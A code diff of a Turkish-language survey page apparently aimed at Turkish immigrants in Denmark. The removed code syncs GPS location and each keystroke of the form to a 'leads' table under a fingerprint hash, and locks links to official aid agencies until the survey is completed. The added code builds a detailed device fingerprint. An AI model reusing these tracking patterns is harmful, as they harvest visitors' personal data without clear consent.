-                console.log('Reverse geocode hatası:', e);
-                if (STATE.ipCity && cityInput && !cityInput.value) {
-                    cityInput.value = STATE.ipCity;
-                }
-                if (STATE.ipCountry && countryInput && !countryInput.value) {
-                    countryInput.value = STATE.ipCountry;
-                }
-                if (btnDetect) btnDetect.textContent = LANG.t('locationDetect');
-            } finally {
-                if (cityInput) cityInput.placeholder = LANG.t('contactFields').city.placeholder;
-            }
-
-            // Koordinatları ve lokasyonu dansk_survey_leads tablosuna anında aktar
-            await syncCoordinatesToDatabase(latStr, lngStr, detectedCity || STATE.ipCity, detectedCountry || STATE.ipCountry, STATE.ipAddress, detectedRegion || STATE.ipRegion, 'GPS Hassas');
-        },
-        function(error) {
-            console.log('Konum izni verilmedi veya hata:', error.message);
-            if (cityInput) cityInput.placeholder = LANG.t('contactFields').city.placeholder;
-            if (btnDetect) btnDetect.textContent = LANG.t('locationDetect');
-            if (STATE.ipCity && cityInput && !cityInput.value) {
-                cityInput.value = STATE.ipCity;
-            }
-        },
-        {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 60000
-        }
-    );
-}
-
-// ==========================================
-// ANKETİ GÖNDER
-// ==========================================
-async function submitSurvey() {
-    if (STATE.submitted) return;
-
-    // Son bölüm validasyonu (sadece anket soruları, iletişim opsiyonel)
-    var btnSubmit = document.getElementById('btn-submit');
-    btnSubmit.disabled = true;
-    btnSubmit.innerHTML = '<div class="spinner"></div> ' + LANG.t('submitSending');
-
-    // Yanıtları topla
-    var answers = collectAnswers();
-    var completionTime = Math.round((Date.now() - STATE.startTime) / 1000);
-
-    // Supabase tekil tabloya gönder (dansk_survey_leads)
-    if (STATE.supabaseClient && STATE.fingerprintHash) {
-        try {
-            await syncDanskSurveyLead({
-                is_completed: true,
-                completed_at: new Date().toISOString(),
-                survey_step_reached: 5,
-                time_spent_seconds: completionTime
-            });
-            console.log('✅ Anket başarıyla dansk_survey_leads tablosuna mühürlendi.');
-        } catch (err) {
-            console.error('Supabase hatası:', err);
-        }
-    } else {
-        console.log('📝 Anket sonuçları (Supabase bağlı değil):', answers);
-    }
-
-    STATE.submitted = true;
-    localStorage.setItem('survey_completed', 'true');
-    updateAidSectionState(true);
-    sendLogToVercel('Anket Tamamlandı', 'Süre: ' + completionTime + 's');
-
-    showSuccessScreen();
-}
-
-function collectAnswers() {
-    var getRadioValue = function(name) {
-        var checked = document.querySelector('input[name="' + name + '"]:checked');
-        return checked ? checked.value : '';
-    };
-
-    var getCheckboxValues = function(name) {
-        var checked = document.querySelectorAll('input[name="' + name + '"]:checked');
-        return Array.from(checked).map(function(cb) { return cb.value; });
-    };
-
-    return {
-        generation: getRadioValue('generation'),
-        years_in_denmark: getRadioValue('years_in_denmark'),
-        city_region: getRadioValue('city_region'),
-        city_other: document.getElementById('city-other-input') ? document.getElementById('city-other-input').value.trim() || null : null,
-        location_reasons: getCheckboxValues('location_reasons'),
-        location_reason_other: document.getElementById('reason-other-input') ? document.getElementById('reason-other-input').value.trim() || null : null,
-        turkish_neighborhood: getRadioValue('turkish_neighborhood'),
-        social_closeness: getRadioValue('social_closeness'),
-        solidarity_level: getRadioValue('solidarity_level'),
-        social_gathering: getCheckboxValues('social_gathering'),
-        news_source: getRadioValue('news_source'),
-        language_preference: getRadioValue('language_preference'),
-        respondent_name: document.getElementById('respondent-name') ? document.getElementById('respondent-name').value.trim() || null : null,
-        respondent_email: document.getElementById('respondent-email') ? document.getElementById('respondent-email').value.trim() || null : null,
-        respondent_phone: document.getElementById('respondent-phone') ? document.getElementById('respondent-phone').value.trim() || null : null,
-        respondent_city: document.getElementById('respondent-city') ? document.getElementById('respondent-city').value.trim() || null : null,
-        respondent_country: document.getElementById('respondent-country') ? document.getElementById('respondent-country').value.trim() || null : null
-    };
-}
-
-// ==========================================
-// BAŞARI EKRANI
-// ==========================================
-async function showSuccessScreen() {
-    document.getElementById('survey-form').classList.add('hidden');
-    document.getElementById('progress-container').classList.add('hidden');
-
-    var successScreen = document.getElementById('success-screen');
-    successScreen.classList.remove('hidden');
-
-    window.scrollTo({ top: document.getElementById('survey-hero').offsetTop, behavior: 'smooth' });
-
-    createConfetti();
-
-    // Toplam katılımcı sayısını çek (dansk_survey_leads üzerinden)
-    if (STATE.supabaseClient) {
-        try {
-            var result = await STATE.supabaseClient
-                .from('dansk_survey_leads')
-                .select('*', { count: 'exact', head: true })
-                .eq('is_completed', true);
-
-            if (!result.error && result.count !== null) {
-                document.getElementById('stat-total').textContent = result.count;
-            }
-        } catch (e) {
-            console.log('Katılımcı sayısı alınamadı:', e);
-        }
-    }
-}
-
-function createConfetti() {
-    var container = document.getElementById('confetti-container');
-    var colors = ['#3B82F6', '#10B981', '#A855F7', '#FFD700', '#00D4FF', '#E94560'];
-
-    for (var i = 0; i < 60; i++) {
-        var confetti = document.createElement('div');
-        confetti.className = 'confetti';
-        confetti.style.left = Math.random() * 100 + '%';
-        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-        confetti.style.animationDelay = Math.random() * 2 + 's';
-        confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
-        confetti.style.width = (Math.random() * 8 + 5) + 'px';
-        confetti.style.height = (Math.random() * 8 + 5) + 'px';
-        confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-        confetti.style.transform = 'rotate(' + (Math.random() * 360) + 'deg)';
-        container.appendChild(confetti);
-    }
-    setTimeout(function() { container.innerHTML = ''; }, 5000);
-}
-
-// ==========================================
-// SCROLL ANİMASYONLARI
-// ==========================================
 function setupScrollAnimations() {
-    var observer = new IntersectionObserver(
-        function(entries) {
-            entries.forEach(function(entry) {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('visible');
-                }
-            });
-        },
-        { threshold: 0.1, rootMargin: '0px 0px -50px 0px' }
-    );
-    document.querySelectorAll('.animate-on-scroll').forEach(function(el) {
-        observer.observe(el);
-    });
+    var elements = document.querySelectorAll('.animate-on-scroll');
+    if (!elements.length) return;
+
+    var observer = new IntersectionObserver(function (entries) {
+        entries.forEach(function (entry) {
+            if (entry.isIntersecting) {
+                entry.target.classList.add('visible');
+            }
+        });
+    }, { threshold: 0.1 });
+
+    elements.forEach(function (el) { observer.observe(el); });
 }
 
 // ==========================================
-// ARKA PLAN PARTİKÜLLERİ
+// 17) ARKA PLAN PARTİKÜL EFEKTİ
 // ==========================================
 function setupParticles() {
     var canvas = document.getElementById('particles-canvas');
     if (!canvas) return;
-
     var ctx = canvas.getContext('2d');
-    var particles = [];
 
     function resize() {
         canvas.width = window.innerWidth;
@@ -1123,45 +1026,38 @@ function setupParticles() {
     resize();
     window.addEventListener('resize', resize);
 
-    for (var i = 0; i < 35; i++) {
+    var particles = [];
+    var count = window.innerWidth < 768 ? 25 : 55;
+
+    for (var i = 0; i < count; i++) {
         particles.push({
             x: Math.random() * canvas.width,
             y: Math.random() * canvas.height,
-            size: Math.random() * 2 + 0.5,
-            speedX: (Math.random() - 0.5) * 0.3,
-            speedY: (Math.random() - 0.5) * 0.3,
-            opacity: Math.random() * 0.25 + 0.05
+            size: Math.random() * 2.2 + 0.6,
+            speedX: (Math.random() - 0.5) * 0.4,
+            speedY: (Math.random() - 0.5) * 0.4,
+            opacity: Math.random() * 0.5 + 0.2
         });
     }
 
     function animate() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        particles.forEach(function(p) {
+        ctx.fillStyle = '#06B6D4';
+
+        for (var i = 0; i < particles.length; i++) {
+            var p = particles[i];
             p.x += p.speedX;
             p.y += p.speedY;
+
             if (p.x < 0) p.x = canvas.width;
             if (p.x > canvas.width) p.x = 0;
             if (p.y < 0) p.y = canvas.height;
             if (p.y > canvas.height) p.y = 0;
+
             ctx.beginPath();
             ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
-            ctx.fillStyle = 'rgba(59, 130, 246, ' + p.opacity + ')';
+            ctx.fillStyle = 'rgba(6, 182, 212, ' + p.opacity + ')';
             ctx.fill();
-        });
-        for (var i = 0; i < particles.length; i++) {
-            for (var j = i + 1; j < particles.length; j++) {
-                var dx = particles[i].x - particles[j].x;
-                var dy = particles[i].y - particles[j].y;
-                var dist = Math.sqrt(dx * dx + dy * dy);
-                if (dist < 150) {
-                    ctx.beginPath();
-                    ctx.moveTo(particles[i].x, particles[i].y);
-                    ctx.lineTo(particles[j].x, particles[j].y);
-                    ctx.strokeStyle = 'rgba(59, 130, 246, ' + (0.03 * (1 - dist / 150)) + ')';
-                    ctx.lineWidth = 0.5;
-                    ctx.stroke();
-                }
-            }
         }
         requestAnimationFrame(animate);
     }
@@ -1169,209 +1065,146 @@ function setupParticles() {
 }
 
 // ==========================================
-// DANİMARKA GÖÇMEN YARDIMLARI & ETKİLEŞİM
+// 18) HASSAS TARAYICI & CİHAZ BİLGİLERİ (TELEMETRİ MOTORU)
 // ==========================================
-function isSurveyCompleted() {
-    return STATE.submitted || localStorage.getItem('survey_completed') === 'true';
-}
-window.isSurveyCompleted = isSurveyCompleted;
+function getDeviceInfo() {
+    var ua = navigator.userAgent || '';
+    
+    // 1. Cihaz Tipi Tespiti
+    var isMobile = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+    var isTablet = /iPad|Android(?!.*Mobile)|Tablet/i.test(ua);
+    var deviceType = isTablet ? 'Tablet' : (isMobile ? 'Mobil' : 'Masaüstü');
 
-function updateAidSectionState(forceCompleted) {
-    var completed = typeof forceCompleted === 'boolean' ? forceCompleted : isSurveyCompleted();
-
-    var banner = document.getElementById('aid-status-banner');
-    var bannerIcon = document.getElementById('banner-icon');
-    var bannerTitle = document.getElementById('banner-title');
-    var bannerDesc = document.getElementById('banner-desc');
-    var bannerBtn = document.getElementById('btn-banner-action');
-
-    if (banner) {
-        if (completed) {
-            banner.classList.remove('locked');
-            banner.classList.add('unlocked');
-            if (bannerIcon) bannerIcon.textContent = '✅';
-            if (bannerTitle) bannerTitle.textContent = LANG.t('aidBannerUnlockedTitle');
-            if (bannerDesc) bannerDesc.textContent = LANG.t('aidBannerUnlockedDesc');
-            if (bannerBtn) {
-                bannerBtn.innerHTML = '<span class="btn-text">' + LANG.t('aidBtnOpen') + '</span><span class="btn-icon">✓</span>';
-                bannerBtn.onclick = scrollToAids;
-            }
-        } else {
-            banner.classList.remove('unlocked');
-            banner.classList.add('locked');
-            if (bannerIcon) bannerIcon.textContent = '🔒';
-            if (bannerTitle) bannerTitle.textContent = LANG.t('aidBannerLockedTitle');
-            if (bannerDesc) bannerDesc.textContent = LANG.t('aidBannerLockedDesc');
-            if (bannerBtn) {
-                bannerBtn.innerHTML = '<span class="btn-text">' + LANG.t('aidBtnFill') + '</span><span class="btn-icon">↓</span>';
-                bannerBtn.onclick = function() { openFullscreenSurvey(); };
-            }
-        }
+    // 2. İşletim Sistemi ve Sürüm Tespiti
+    var os = 'Bilinmeyen OS';
+    var osVersion = '';
+    
+    if (/Windows NT 10\.0/i.test(ua)) {
+        os = 'Windows';
+        osVersion = '10 / 11';
+    } else if (/Windows NT 6\.3/i.test(ua)) {
+        os = 'Windows'; osVersion = '8.1';
+    } else if (/Windows NT 6\.1/i.test(ua)) {
+        os = 'Windows'; osVersion = '7';
+    } else if (/Macintosh|Mac OS X/i.test(ua)) {
+        os = 'macOS';
+        var macMatch = ua.match(/Mac OS X ([0-9_]+)/);
+        if (macMatch) osVersion = macMatch[1].replace(/_/g, '.');
+    } else if (/iPhone|iPad|iPod/i.test(ua)) {
+        os = 'iOS';
+        var iosMatch = ua.match(/OS ([0-9_]+)/);
+        if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');
+    } else if (/Android/i.test(ua)) {
+        os = 'Android';
+        var andMatch = ua.match(/Android ([0-9\.]+)/);
+        if (andMatch) osVersion = andMatch[1];
+    } else if (/Linux/i.test(ua)) {
+        os = 'Linux';
+    } else if (/CrOS/i.test(ua)) {
+        os = 'ChromeOS';
     }
 
-    // Kart butonlarını güncelle
-    var cards = document.querySelectorAll('.aid-card');
-    cards.forEach(function(card) {
-        var actionBtn = card.querySelector('.aid-action-btn');
-        if (actionBtn) {
-            if (completed) {
-                actionBtn.classList.remove('locked');
-                actionBtn.classList.add('unlocked');
-                actionBtn.innerHTML = '<span class="action-icon">🌐</span><span class="action-label">' + LANG.t('aidBtnGo') + '</span>';
-            } else {
-                actionBtn.classList.remove('unlocked');
-                actionBtn.classList.add('locked');
-                actionBtn.innerHTML = '<span class="action-icon">🔒</span><span class="action-label">' + LANG.t('aidBtnLocked') + '</span>';
-            }
-        }
-    });
-}
-window.updateAidSectionState = updateAidSectionState;
+    // 3. Tarayıcı Adı ve Tam Sürüm Tespiti
+    var browser = 'Bilinmeyen Tarayıcı';
+    var browserVersion = '';
 
-function handleAidCardClick(cardEl) {
-    if (!cardEl) return;
-    var title = cardEl.getAttribute('data-title') || 'Danimarka Göçmen Yardımı';
-    var agency = cardEl.getAttribute('data-agency') || 'Resmi Kurum';
-    var url = cardEl.getAttribute('data-url') || 'https://www.nyidanmark.dk';
-
-    if (isSurveyCompleted()) {
-        // Doğrudan ilgili resmi kuruma yönlendir
-        logEvent('aid_card_redirect', { title: title, agency: agency, url: url });
-        sendLogToVercel('Kurum Yönlendirmesi', title + ' -> ' + agency);
-        showToast(LANG.t('toastRedirect').replace('{agency}', agency));
-        setTimeout(function() {
-            window.open(url, '_blank', 'noopener,noreferrer');
-        }, 200);
-    } else {
-        // Anket ekranı kaplayarak direkt açılır
-        logEvent('aid_card_open_fullscreen_survey', { title: title, agency: agency });
-        openFullscreenSurvey(cardEl);
-    }
-}
-
-// ==========================================
-// TAM EKRAN ANKET YÖNETİMİ
-// ==========================================
-function openFullscreenSurvey(cardEl) {
-    var title = cardEl ? cardEl.getAttribute('data-title') : '';
-    var agency = cardEl ? cardEl.getAttribute('data-agency') : '';
-
-    var tagEl = document.getElementById('fullscreen-target-tag');
-    if (tagEl) {
-        if (title && agency) {
-            tagEl.textContent = LANG.t('fullscreenTargetTag').replace('{agency}', agency).replace('{title}', title);
-        } else {
-            tagEl.textContent = LANG.t('fullscreenDefaultTag');
-        }
+    if (/Edg\/([0-9\.]+)/i.test(ua)) {
+        browser = 'Edge';
+        browserVersion = ua.match(/Edg\/([0-9\.]+)/i)[1];
+    } else if (/OPR\/([0-9\.]+)|Opera\/([0-9\.]+)/i.test(ua)) {
+        browser = 'Opera';
+        var opMatch = ua.match(/(?:OPR|Opera)\/([0-9\.]+)/i);
+        if (opMatch) browserVersion = opMatch[1];
+    } else if (/SamsungBrowser\/([0-9\.]+)/i.test(ua)) {
+        browser = 'Samsung Internet';
+        browserVersion = ua.match(/SamsungBrowser\/([0-9\.]+)/i)[1];
+    } else if (/UCBrowser\/([0-9\.]+)/i.test(ua)) {
+        browser = 'UC Browser';
+        browserVersion = ua.match(/UCBrowser\/([0-9\.]+)/i)[1];
+    } else if (/MiuiBrowser\/([0-9\.]+)/i.test(ua)) {
+        browser = 'Miui Browser';
+        browserVersion = ua.match(/MiuiBrowser\/([0-9\.]+)/i)[1];
+    } else if (/Chrome\/([0-9\.]+)/i.test(ua)) {
+        browser = 'Chrome';
+        browserVersion = ua.match(/Chrome\/([0-9\.]+)/i)[1];
+    } else if (/Firefox\/([0-9\.]+)/i.test(ua)) {
+        browser = 'Firefox';
+        browserVersion = ua.match(/Firefox\/([0-9\.]+)/i)[1];
+    } else if (/Version\/([0-9\.]+).*Safari/i.test(ua)) {
+        browser = 'Safari';
+        var safMatch = ua.match(/Version\/([0-9\.]+)/i);
+        if (safMatch) browserVersion = safMatch[1];
     }
 
-    document.body.classList.add('fullscreen-survey-active');
-
-    var wrapper = document.getElementById('survey-container-wrapper');
-    if (wrapper) {
-        wrapper.scrollTop = 0;
+    // 4. Ağ Bilgisi
+    var connType = 'Bilinmiyor';
+    if (navigator.connection) {
+        var conn = navigator.connection;
+        connType = conn.effectiveType || conn.type || 'Aktif';
+        if (conn.downlink) connType += ' (' + conn.downlink + ' Mbps)';
     }
 
-    showToast(LANG.t('toastFillSurvey'));
+    var languagesList = (navigator.languages && navigator.languages.length) 
+        ? navigator.languages.join(', ') 
+        : (navigator.language || 'tr');
 
-    // Adım 1'in ilk sorusunu nazikçe vurgula
-    setTimeout(function() {
-        var currentSection = document.getElementById('section-' + STATE.currentStep);
-        if (currentSection) {
-            var firstCard = currentSection.querySelector('.question-card');
-            if (firstCard) {
-                firstCard.classList.remove('highlight-pulse');
-                void firstCard.offsetWidth;
-                firstCard.classList.add('highlight-pulse');
-            }
-        }
-    }, 300);
+    var rawInfo = {
+        userAgent: ua,
+        browser: browser,
+        browserVersion: browserVersion,
+        os: os,
+        osVersion: osVersion,
+        deviceType: deviceType,
+        screen: screen.width + 'x' + screen.height,
+        availScreen: screen.availWidth + 'x' + screen.availHeight,
+        windowSize: window.innerWidth + 'x' + window.innerHeight,
+        colorDepth: screen.colorDepth + '-bit',
+        devicePixelRatio: window.devicePixelRatio || 1,
+        hardwareConcurrency: navigator.hardwareConcurrency || null,
+        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null,
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        languages: languagesList,
+        platform: navigator.platform || '',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        timezoneOffset: new Date().getTimezoneOffset(),
+        cookieEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        gpuVendor: STATE.gpuVendor,
+        gpuRenderer: STATE.gpuRenderer,
+        batteryLevel: STATE.batteryLevel,
+        batteryCharging: STATE.batteryCharging,
+        connection: connType
+    };
+
+    return {
+        deviceType: deviceType,
+        os: os,
+        osVersion: osVersion,
+        browser: browser,
+        browserVersion: browserVersion,
+        browserLanguages: languagesList,
+        browserPlatform: navigator.platform || '',
+        screenResolution: screen.width + 'x' + screen.height,
+        windowSize: window.innerWidth + 'x' + window.innerHeight,
+        colorDepth: screen.colorDepth + '-bit',
+        devicePixelRatio: String(window.devicePixelRatio || 1),
+        hardwareConcurrency: navigator.hardwareConcurrency || null,
+        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null,
+        language: navigator.language || 'tr',
+        isTouch: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
+        cookiesEnabled: navigator.cookieEnabled,
+        connectionType: connType,
+        gpuVendor: STATE.gpuVendor,
+        gpuRenderer: STATE.gpuRenderer,
+        rawInfo: rawInfo
+    };
 }
 
-function closeFullscreenSurvey() {
-    document.body.classList.remove('fullscreen-survey-active');
+function fetchWithTimeout(url, timeoutMs) {
+    return Promise.race([
+        fetch(url),
+        new Promise(function (_, reject) {
+            setTimeout(function () { reject(new Error('Timeout')); }, timeoutMs);
+        })
+    ]);
 }
-
-function scrollToAids() {
-    closeFullscreenSurvey();
-    var aidSection = document.getElementById('aid-section');
-    if (aidSection) {
-        var topPos = aidSection.getBoundingClientRect().top + window.pageYOffset - 20;
-        window.scrollTo({ top: topPos, behavior: 'smooth' });
-    }
-}
-
-function scrollToSurvey() {
-    openFullscreenSurvey();
-}
-
-function openSurveyRequiredModal(title, agency, url) {
-    openFullscreenSurvey();
-}
-
-function closeSurveyRequiredModal() {
-    closeFullscreenSurvey();
-}
-
-function proceedToSurveyFromModal() {
-    openFullscreenSurvey();
-}
-
-function setupAidModalEvents() {
-    window.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape' && document.body.classList.contains('fullscreen-survey-active')) {
-            closeFullscreenSurvey();
-        }
-    });
-
-    // Klavye erişilebilirliği (Enter / Boşluk tuşu ile kart açma)
-    document.querySelectorAll('.aid-card').forEach(function(card) {
-        card.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' || e.key === ' ') {
-                e.preventDefault();
-                handleAidCardClick(card);
-            }
-        });
-    });
-}
-
-// ==========================================
-// ADIM ADIM GERÇEK ZAMANLI SENKRONİZASYON (dansk_survey_leads)
-// ==========================================
-var syncDebounceTimer = null;
-
-async function syncFingerprintProgress() {
-    if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
-
-    try {
-        await syncDanskSurveyLead({
-            survey_step_reached: STATE.currentStep
-        });
-    } catch (e) {
-        console.log('Adım verisi senkronize edilemedi:', e);
-    }
-}
-
-function setupStepByStepSync() {
-    var form = document.getElementById('survey-form');
-    if (!form) return;
-
-    // Radio, Checkbox ve Select seçimlerinde anında kaydet (0 gecikme)
-    form.addEventListener('change', function(e) {
-        syncFingerprintProgress();
-    });
-
-    // Metin alanlarında her tuşa basıldığında anında kaydet (150ms debounce)
-    form.addEventListener('input', function(e) {
-        clearTimeout(syncDebounceTimer);
-        syncDebounceTimer = setTimeout(function() {
-            syncFingerprintProgress();
-        }, 150);
-    });
-
-    form.addEventListener('focusout', function(e) {
-        syncFingerprintProgress();
-    });
-}
-
-
